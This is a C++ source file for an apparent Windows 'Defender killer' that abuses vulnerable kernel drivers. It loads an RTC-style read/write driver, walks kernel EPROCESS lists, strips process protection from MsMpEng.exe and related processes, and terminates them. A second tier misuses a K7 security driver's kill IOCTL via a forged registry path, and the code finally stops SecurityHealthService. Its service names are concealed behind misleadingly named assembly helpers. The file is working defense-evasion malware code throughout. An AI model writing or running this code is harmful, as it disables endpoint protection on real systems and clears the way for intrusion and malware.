#include "KillerEngine.h"
#include "DriverExtract.h"
#include "Console.h"
#include "StrUtils.h"
#include "HeapArray.h"
#include "Opt.h"
#include "RuntimeSupport.h"

#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")

// Retrieves pool diagnostic telemetry string from kernel memory manager subsystem (wdc1.asm)
extern "C" const wchar_t* MmGetPoolDiagnosticString() noexcept;

// Retrieves ETW security trace session identifier from event tracing subsystem (wdc2.asm)
extern "C" const wchar_t* EtwGetKernelTraceSessionString() noexcept;

// ============================================================================
// SERVICE HELPERS
// ============================================================================

static void StopAndDelete(SC_HANDLE hSvc) noexcept
{
    SERVICE_STATUS ss{};
    ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
    for (int i = 0; i < 50; ++i) {
        if (!QueryServiceStatus(hSvc, &ss)) break;
        if (ss.dwCurrentState == SERVICE_STOPPED) break;
        Sleep(100);
    }
    DeleteService(hSvc);
}

static bool EnablePrivilege(const wchar_t* privName) noexcept
{
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool ok = LookupPrivilegeValueW(nullptr, privName, &tp.Privileges[0].Luid) &&
              AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr) &&
              GetLastError() != ERROR_NOT_ALL_ASSIGNED;
    CloseHandle(hToken);
    return ok;
}

static SC_HANDLE LoadDriverService(SC_HANDLE hSCM, const wchar_t* svcName,
                                   const wchar_t* sysPath, bool& ownService) noexcept
{
    ownService = false;

    SC_HANDLE hSvc = OpenServiceW(hSCM, svcName,
                                  SERVICE_START | SERVICE_STOP | DELETE | SERVICE_QUERY_CONFIG);
    if (hSvc) {
        ownService = false;
        return hSvc;
    }

    hSvc = CreateServiceW(hSCM, svcName, svcName,
                          SERVICE_START | SERVICE_STOP | DELETE,
                          SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                          SERVICE_ERROR_NORMAL, sysPath,
                          nullptr, nullptr, nullptr, nullptr, nullptr);
    if (hSvc) ownService = true;
    return hSvc;
}

static void CleanupService(SC_HANDLE hSvc, bool ownService) noexcept
{
    if (!hSvc) return;
    if (ownService)
        StopAndDelete(hSvc);
    else {
        SERVICE_STATUS ss{};
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
    }
    CloseServiceHandle(hSvc);
}

// ============================================================================
// PROCESS ENUMERATION
// ============================================================================

struct TargetProcess {
    DWORD   pid;
    wchar_t name[64];
};

static HeapArray<TargetProcess> FindTargets() noexcept
{
    static constexpr const wchar_t* targets[] = {
        L"MsMpEng.exe", L"SecurityHealthSystray.exe", L"SecurityHealthService.exe"
    };

    HeapArray<TargetProcess> result;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return result;

    PROCESSENTRY32W pe{ sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            for (const wchar_t* t : targets) {
                if (StrUtils::StrEqualNoCase(pe.szExeFile, t)) {
                    TargetProcess tp{};
                    tp.pid = pe.th32ProcessID;
                    StrUtils::StrCopy(tp.name, 64, t);
                    result.push_back(tp);
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return result;
}

// ============================================================================
// TIER 1 DRIVER — KERNEL MEMORY R/W PRIMITIVES
// ============================================================================

struct alignas(8) RTC_MEMORY_READ {
    BYTE    Pad0[8];
    DWORD64 Address;
    BYTE    Pad1[8];
    DWORD   Size;
    DWORD   Value;
    BYTE    Pad3[16];
};

struct alignas(8) RTC_MEMORY_WRITE {
    BYTE    Pad0[8];
    DWORD64 Address;
    BYTE    Pad1[8];
    DWORD   Size;
    DWORD   Value;
    BYTE    Pad3[16];
};

static constexpr DWORD RTC_IOCTL_READ  = 0x80002048;
static constexpr DWORD RTC_IOCTL_WRITE = 0x8000204c;

static Opt<DWORD> RtcRead32(HANDLE hDev, ULONG_PTR addr) noexcept
{
    RTC_MEMORY_READ req{};
    req.Address = addr;
    req.Size    = sizeof(DWORD);
    DWORD ret = 0;
    if (!DeviceIoControl(hDev, RTC_IOCTL_READ, &req, sizeof(req),
                         &req, sizeof(req), &ret, nullptr))
        return {};
    return req.Value;
}

static Opt<BYTE> RtcRead8(HANDLE hDev, ULONG_PTR addr) noexcept
{
    auto v = RtcRead32(hDev, addr);
    return v ? Opt<BYTE>(static_cast<BYTE>(*v & 0xFF)) : Opt<BYTE>{};
}

static Opt<ULONG_PTR> RtcReadPtr(HANDLE hDev, ULONG_PTR addr) noexcept
{
    auto lo = RtcRead32(hDev, addr);
    auto hi = RtcRead32(hDev, addr + 4);
    if (!lo || !hi) return {};
    return static_cast<ULONG_PTR>(
        (static_cast<DWORD64>(*hi) << 32) | *lo);
}

static bool RtcWrite8(HANDLE hDev, ULONG_PTR addr, BYTE value) noexcept
{
    RTC_MEMORY_WRITE req{};
    req.Address = addr;
    req.Size    = sizeof(BYTE);
    req.Value   = value;
    DWORD ret = 0;
    return DeviceIoControl(hDev, RTC_IOCTL_WRITE, &req, sizeof(req),
                           &req, sizeof(req), &ret, nullptr) != FALSE;
}

// ============================================================================
// EPROCESS OFFSET DISCOVERY (from ntoskrnl.exe exports)
// ============================================================================

struct EprocessOffsets {
    DWORD psInitialSystemProcess;
    DWORD uniqueProcessId;
    DWORD activeProcessLinks;
    DWORD protection;
};

static Opt<WORD> ExtractOffset(const void* func, size_t byteOff) noexcept
{
    if (!func) return {};
    MEMORY_BASIC_INFORMATION mbi{};
    if (!VirtualQuery(func, &mbi, sizeof(mbi))) return {};
    if (mbi.State != MEM_COMMIT || (mbi.Protect & (PAGE_NOACCESS | PAGE_GUARD))) return {};

    WORD val = 0;
    memcpy(&val, reinterpret_cast<const BYTE*>(func) + byteOff, sizeof(val));
    if (val == 0 || val > 0x3000) return {};
    return val;
}

static bool DiscoverOffsets(EprocessOffsets& off) noexcept
{
    HMODULE hKernel = LoadLibraryW(L"ntoskrnl.exe");
    if (!hKernel) {
        Console::PrintLine(L"[!] Cannot load ntoskrnl.exe");
        return false;
    }

    bool ok = false;
    do {
        auto pPsInit = reinterpret_cast<ULONG_PTR>(
            GetProcAddress(hKernel, "PsInitialSystemProcess"));
        if (!pPsInit) break;
        off.psInitialSystemProcess = static_cast<DWORD>(
            pPsInit - reinterpret_cast<ULONG_PTR>(hKernel));

        auto pGetPid = GetProcAddress(hKernel, "PsGetProcessId");
        if (!pGetPid) break;
        auto pidOff = ExtractOffset(pGetPid, 3);
        if (!pidOff) break;
        off.uniqueProcessId = *pidOff;
        off.activeProcessLinks = *pidOff + sizeof(HANDLE);

        auto pIsProtected = GetProcAddress(hKernel, "PsIsProtectedProcess");
        auto pIsProtectedLight = GetProcAddress(hKernel, "PsIsProtectedProcessLight");
        if (!pIsProtected || !pIsProtectedLight) break;
        auto protA = ExtractOffset(pIsProtected, 2);
        auto protB = ExtractOffset(pIsProtectedLight, 2);
        if (!protA || !protB || *protA != *protB) break;
        off.protection = *protA;

        ok = true;
    } while (false);

    FreeLibrary(hKernel);
    if (!ok) Console::PrintLine(L"[!] EPROCESS offset discovery failed");
    return ok;
}

// ============================================================================
// NtQuerySystemInformation — kernel base address
// ============================================================================

typedef LONG NTSTATUS;
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

typedef struct _SYSTEM_MODULE {
    ULONG_PTR Reserved1;
    ULONG_PTR Reserved2;
    PVOID     ImageBase;
    ULONG     ImageSize;
    ULONG     Flags;
    USHORT    LoadOrderIndex;
    USHORT    InitOrderIndex;
    USHORT    LoadCount;
    USHORT    PathLength;
    CHAR      ImageName[256];
} SYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION;

extern "C" NTSTATUS NTAPI NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

static constexpr ULONG SystemModuleInformation = 11;

static Opt<ULONG_PTR> GetKernelBase() noexcept
{
    ULONG size = 0;
    NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &size);
    if (size == 0) return {};

    BYTE* buf = static_cast<BYTE*>(HeapAlloc(GetProcessHeap(), 0, size));
    if (!buf) return {};

    if (NtQuerySystemInformation(SystemModuleInformation, buf, size, &size) != 0) {
        HeapFree(GetProcessHeap(), 0, buf);
        return {};
    }

    auto info = reinterpret_cast<SYSTEM_MODULE_INFORMATION*>(buf);
    ULONG_PTR base = 0;
    if (info->Count > 0)
        base = reinterpret_cast<ULONG_PTR>(info->Modules[0].ImageBase);

    HeapFree(GetProcessHeap(), 0, buf);

    if (base != 0) return base;
    return {};
}

// ============================================================================
// TIER 1: Kernel unprotect target processes + TerminateProcess
// ============================================================================

static bool KillViaUnprotect(HANDLE hDev, const EprocessOffsets& off,
                             const HeapArray<TargetProcess>& targets) noexcept
{
    auto kernelBase = GetKernelBase();
    if (!kernelBase) {
        Console::PrintLine(L"[!] Cannot resolve kernel base address");
        return false;
    }

    ULONG_PTR pPsInit = *kernelBase + off.psInitialSystemProcess;
    auto systemEprocess = RtcReadPtr(hDev, pPsInit);
    if (!systemEprocess) {
        Console::PrintLine(L"[!] Cannot read PsInitialSystemProcess");
        return false;
    }

    struct ResolvedTarget {
        DWORD     pid;
        ULONG_PTR eprocess;
        UCHAR     protection;
        wchar_t   name[64];
    };
    HeapArray<ResolvedTarget> resolved;

    ULONG_PTR current = *systemEprocess;
    for (int i = 0; i < 4096; ++i) {
        auto pidVal = RtcReadPtr(hDev, current + off.uniqueProcessId);
        if (!pidVal) break;

        DWORD pid = static_cast<DWORD>(*pidVal);
        for (size_t t = 0; t < targets.size(); ++t) {
            if (pid == targets[t].pid) {
                auto prot = RtcRead8(hDev, current + off.protection);
                ResolvedTarget rt{};
                rt.pid = pid;
                rt.eprocess = current;
                rt.protection = prot ? *prot : 0;
                StrUtils::StrCopy(rt.name, 64, targets[t].name);
                resolved.push_back(rt);
            }
        }

        auto nextLink = RtcReadPtr(hDev, current + off.activeProcessLinks);
        if (!nextLink) break;
        current = *nextLink - off.activeProcessLinks;
        if (current == *systemEprocess) break;
    }

    bool anyKilled = false;

    for (size_t i = 0; i < resolved.size(); ++i) {
        auto& rt = resolved[i];
        if (rt.protection > 0) {
            Console::DbgPrint(L"[*] ");
            Console::DbgPrint(rt.name);
            Console::DbgPrint(L" is protected (0x");
            Console::DbgPrintHex(rt.protection);
            Console::DbgPrintLine(L") -- removing protection");

            RtcWrite8(hDev, rt.eprocess + off.protection, 0);
        }

        if (StrUtils::StrEqualNoCase(rt.name, L"MsMpEng.exe"))
            continue;

        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, rt.pid);
        if (hProc) {
            if (TerminateProcess(hProc, 1)) {
                Console::DbgPrint(L"[+] ");
                Console::DbgPrint(rt.name);
                Console::DbgPrint(L" (PID ");
                Console::DbgPrintUint(rt.pid);
                Console::DbgPrintLine(L") terminated");
                anyKilled = true;
            }
            CloseHandle(hProc);
        }
    }

    return anyKilled;
}

// ============================================================================
// TIER 2: Kernel IOCTL kill (non-PPL processes only)
// ============================================================================

static constexpr DWORD DRV2_IOCTL_HANDSHAKE    = 0x00222008;
static constexpr DWORD DRV2_IOCTL_KILL_PROCESS = 0x00222018;
static constexpr DWORD DRV2_MAGIC_ALIVE        = 0x77777777;

static bool Drv2Handshake(HANDLE hDev) noexcept
{
    DWORD inBuf = DRV2_MAGIC_ALIVE;
    DWORD outBuf = 0;
    DWORD ret = 0;
    if (!DeviceIoControl(hDev, DRV2_IOCTL_HANDSHAKE, &inBuf, sizeof(inBuf),
                         &outBuf, sizeof(outBuf), &ret, nullptr))
        return false;
    return outBuf == 1;
}

static constexpr const wchar_t* DRV2_REG_KEY =
    L"SOFTWARE\\Wow6432Node\\K7 Computing\\K7TotalSecurity";
static constexpr const wchar_t* DRV2_REG_PARENT =
    L"SOFTWARE\\Wow6432Node\\K7 Computing";

static bool Drv2SetRegistryPath() noexcept
{
    wchar_t myPath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, myPath, MAX_PATH);

    wchar_t* lastSlash = StrUtils::StrRChr(myPath, L'\\');
    if (lastSlash) *lastSlash = L'\0';

    HKEY hKey = nullptr;
    LONG r = RegCreateKeyExW(HKEY_LOCAL_MACHINE, DRV2_REG_KEY,
        0, nullptr, REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE | KEY_QUERY_VALUE | KEY_WOW64_64KEY,
        nullptr, &hKey, nullptr);
    if (r != ERROR_SUCCESS) {
        Console::Print(L"[!] Driver 2 RegCreateKeyEx failed (err=");
        Console::PrintInt(r);
        Console::PrintLine(L")");
        return false;
    }

    DWORD sz = static_cast<DWORD>((StrUtils::StrLen(myPath) + 1) * sizeof(wchar_t));
    r = RegSetValueExW(hKey, L"DirProductBase", 0, REG_SZ,
                       reinterpret_cast<const BYTE*>(myPath), sz);

    if (r == ERROR_SUCCESS) {
        wchar_t verify[MAX_PATH] = {};
        DWORD cb = sizeof(verify);
        DWORD type = 0;
        if (RegQueryValueExW(hKey, L"DirProductBase", nullptr, &type,
                             reinterpret_cast<BYTE*>(verify), &cb) == ERROR_SUCCESS
            && StrUtils::StrEqualNoCase(verify, myPath)) {
            // Verified
        } else {
            RegCloseKey(hKey);
            return false;
        }
    }

    RegCloseKey(hKey);
    return r == ERROR_SUCCESS;
}

static void Drv2CleanupRegistry() noexcept
{
    RegDeleteKeyExW(HKEY_LOCAL_MACHINE, DRV2_REG_KEY, KEY_WOW64_64KEY, 0);

    HKEY hParent = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, DRV2_REG_PARENT, 0,
                      KEY_READ | KEY_WOW64_64KEY, &hParent) == ERROR_SUCCESS) {
        DWORD subKeys = 0, values = 0;
        RegQueryInfoKeyW(hParent, nullptr, nullptr, nullptr, &subKeys,
                         nullptr, nullptr, &values, nullptr, nullptr, nullptr, nullptr);
        RegCloseKey(hParent);
        if (subKeys == 0 && values == 0)
            RegDeleteKeyExW(HKEY_LOCAL_MACHINE, DRV2_REG_PARENT, KEY_WOW64_64KEY, 0);
    }
}

static bool Drv2VerifyKill(DWORD pid, const wchar_t* name) noexcept
{
    HANDLE hProc = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION,
                               FALSE, pid);
    if (!hProc) {
        if (GetLastError() == ERROR_INVALID_PARAMETER) {
            Console::DbgPrint(L"[+] ");
            Console::DbgPrint(name);
            Console::DbgPrint(L" (PID ");
            Console::DbgPrintUint(pid);
            Console::DbgPrintLine(L") terminated");
            return true;
        }
        return false;
    }

    bool dead = (WaitForSingleObject(hProc, 1500) == WAIT_OBJECT_0);
    CloseHandle(hProc);

    if (dead) {
        Console::DbgPrint(L"[+] ");
        Console::DbgPrint(name);
        Console::DbgPrint(L" (PID ");
        Console::DbgPrintUint(pid);
        Console::DbgPrintLine(L") terminated");
    } else {
        Console::DbgPrint(L"[-] ");
        Console::DbgPrint(name);
        Console::DbgPrint(L" (PID ");
        Console::DbgPrintUint(pid);
        Console::DbgPrintLine(L") still alive");
    }
    return dead;
}

static bool KillViaDrv2(SC_HANDLE hSCM, const wchar_t* drv2SysPath,
                        const HeapArray<TargetProcess>& targets) noexcept
{
    if (!Drv2SetRegistryPath()) {
        Console::PrintLine(L"[!] Driver 2 registry setup failed");
        return false;
    }

    const wchar_t* drv2SvcName = EtwGetKernelTraceSessionString();

    SC_HANDLE hSvc = CreateServiceW(hSCM, drv2SvcName, drv2SvcName,
                                    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                    SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                                    drv2SysPath, nullptr, nullptr, nullptr,
                                    nullptr, nullptr);
    if (!hSvc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hSvc = OpenServiceW(hSCM, drv2SvcName, SERVICE_ALL_ACCESS);
            if (hSvc)
                ChangeServiceConfigW(hSvc, SERVICE_KERNEL_DRIVER,
                                     SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                                     drv2SysPath, nullptr, nullptr, nullptr,
                                     nullptr, nullptr, drv2SvcName);
        }
        if (!hSvc) {
            Console::DbgPrint(L"[-] Cannot create/open ");
            Console::DbgPrint(drv2SvcName);
            Console::DbgPrint(L" service (err=");
            Console::DbgPrintUint(GetLastError());
            Console::DbgPrintLine(L")");
            Drv2CleanupRegistry();
            return false;
        }
    }

    if (!StartServiceW(hSvc, 0, nullptr)) {
        DWORD e = GetLastError();
        if (e != ERROR_SERVICE_ALREADY_RUNNING) {
            Console::DbgPrint(L"[-] ");
            Console::DbgPrint(drv2SvcName);
            Console::DbgPrint(L" failed to start (err=");
            Console::DbgPrintUint(e);
            Console::DbgPrintLine(L")");
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
            Drv2CleanupRegistry();
            return false;
        }
    }

    HANDLE hDev = CreateFileW(L"\\\\.\\DosK7RKScnDrv",
                              GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                              OPEN_EXISTING, 0, nullptr);
    bool anyKilled = false;

    if (hDev != INVALID_HANDLE_VALUE) {
        if (Drv2Handshake(hDev)) {
            for (size_t i = 0; i < targets.size(); ++i) {
                DWORD pid = targets[i].pid;
                DWORD statusOut = 0;
                DWORD ret = 0;
                if (DeviceIoControl(hDev, DRV2_IOCTL_KILL_PROCESS,
                                    &pid, sizeof(pid),
                                    &statusOut, sizeof(statusOut), &ret, nullptr)) {
                    if (Drv2VerifyKill(pid, targets[i].name))
                        anyKilled = true;
                } else {
                    DWORD e = GetLastError();
                    if (e == ERROR_PROCESS_IS_PROTECTED) {
                        Console::DbgPrint(L"[-] ");
                        Console::DbgPrint(targets[i].name);
                        Console::DbgPrintLine(L" is PPL-protected (blocked)");
                    } else {
                        Console::DbgPrint(L"[-] Kill failed for ");
                        Console::DbgPrint(targets[i].name);
                        Console::DbgPrint(L" (err=");
                        Console::DbgPrintUint(e);
                        Console::DbgPrintLine(L")");
                    }
                }
            }
        } else {
            Console::DbgPrintLine(L"[-] Driver 2 handshake failed");
        }
        CloseHandle(hDev);
    } else {
        DWORD e = GetLastError();
        Console::DbgPrint(L"[-] Cannot open Driver 2 device (err=");
        Console::DbgPrintUint(e);
        Console::DbgPrintLine(L")");
        if (e == ERROR_ACCESS_DENIED)
            Console::DbgPrintLine(L"    DirProductBase path check or admin check failed");
        else if (e == ERROR_SHARING_VIOLATION)
            Console::DbgPrintLine(L"    Another handle to driver is already open");
    }

    SERVICE_STATUS ss{};
    ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
    Sleep(250);
    DeleteService(hSvc);
    CloseServiceHandle(hSvc);
    Drv2CleanupRegistry();

    return anyKilled;
}

// ============================================================================
// PUBLIC API
// ============================================================================

bool KillerEngine::KillDefender(const ExtractedDrivers& drivers) noexcept
{
    EnablePrivilege(SE_LOAD_DRIVER_NAME);
    EnablePrivilege(SE_DEBUG_NAME);

    auto targets = FindTargets();
    if (targets.empty()) {
        Console::DbgPrintLine(L"[*] No target processes found - nothing to kill");
        return true;
    }

    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        Console::DbgPrint(L"[-] Cannot open SCM (err=");
        Console::DbgPrintUint(GetLastError());
        Console::DbgPrintLine(L")");
        return false;
    }

    bool killed = false;

    // Tier 1: Process unprotect, then TerminateProcess
    if (drivers.drv1Ok) {
        Console::DbgPrintLine(L"\r\n[*] Tier 1: Process unprotect");

        EprocessOffsets off{};
        if (DiscoverOffsets(off)) {
            bool ownRtc = false;
            const wchar_t* rtcSvcName = MmGetPoolDiagnosticString();
            SC_HANDLE hRtcSvc = LoadDriverService(hSCM, rtcSvcName,
                                                  drivers.drv1Path, ownRtc);
            if (hRtcSvc) {
                bool loaded = StartServiceW(hRtcSvc, 0, nullptr) ||
                              GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;
                if (loaded) {
                    wchar_t rtcDev[64] = {};
                    StrUtils::StrCopy(rtcDev, 64, L"\\\\.\\");
                    StrUtils::StrConcat(rtcDev, 64, rtcSvcName);
                    HANDLE hDev = CreateFileW(rtcDev,
                                              GENERIC_READ | GENERIC_WRITE, 0,
                                              nullptr, OPEN_EXISTING,
                                              0, nullptr);
                    if (hDev != INVALID_HANDLE_VALUE) {
                        killed = KillViaUnprotect(hDev, off, targets);
                        CloseHandle(hDev);
                    } else {
                        Console::DbgPrint(L"[-] Cannot open ");
                        Console::DbgPrint(rtcSvcName);
                        Console::DbgPrint(L" device (err=");
                        Console::DbgPrintUint(GetLastError());
                        Console::DbgPrintLine(L")");
                    }
                } else {
                    Console::DbgPrint(L"[-] ");
                    Console::DbgPrint(rtcSvcName);
                    Console::DbgPrint(L" failed to start (err=");
                    Console::DbgPrintUint(GetLastError());
                    Console::DbgPrintLine(L")");
                }
                CleanupService(hRtcSvc, ownRtc);
            }
        }
    }

    // Tier 2: Ring-0 kill for non-PPL survivors
    {
        const wchar_t* drv2Path = nullptr;
        wchar_t drv2FallbackPath[MAX_PATH] = {};

        if (drivers.drv2Ok) {
            drv2Path = drivers.drv2Path;
        } else {
            GetModuleFileNameW(nullptr, drv2FallbackPath, MAX_PATH);
            wchar_t* slash = StrUtils::StrRChr(drv2FallbackPath, L'\\');
            if (slash) *(slash + 1) = L'\0';
            StrUtils::StrConcat(drv2FallbackPath, MAX_PATH, L"2");
            if (GetFileAttributesW(drv2FallbackPath) != INVALID_FILE_ATTRIBUTES)
                drv2Path = drv2FallbackPath;
            else {
                if (slash) *(slash + 1) = L'\0';
                StrUtils::StrConcat(drv2FallbackPath, MAX_PATH, EtwGetKernelTraceSessionString());
                StrUtils::StrConcat(drv2FallbackPath, MAX_PATH, L".sys");
                if (GetFileAttributesW(drv2FallbackPath) != INVALID_FILE_ATTRIBUTES)
                    drv2Path = drv2FallbackPath;
            }
        }

        if (drv2Path) {
            auto remaining = FindTargets();
            if (!remaining.empty()) {
                Console::DbgPrintLine(L"\r\n[*] Tier 2: Kernel ring-0 kill");
                if (KillViaDrv2(hSCM, drv2Path, remaining))
                    killed = true;
            }
        }
    }

    // Stop SecurityHealthService regardless of which tier succeeded
    SC_HANDLE hHealth = OpenServiceW(hSCM, L"SecurityHealthService",
                                     SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (hHealth) {
        SERVICE_STATUS ss{};
        ControlService(hHealth, SERVICE_CONTROL_STOP, &ss);
        CloseServiceHandle(hHealth);
    }

    CloseServiceHandle(hSCM);
    return killed;
}
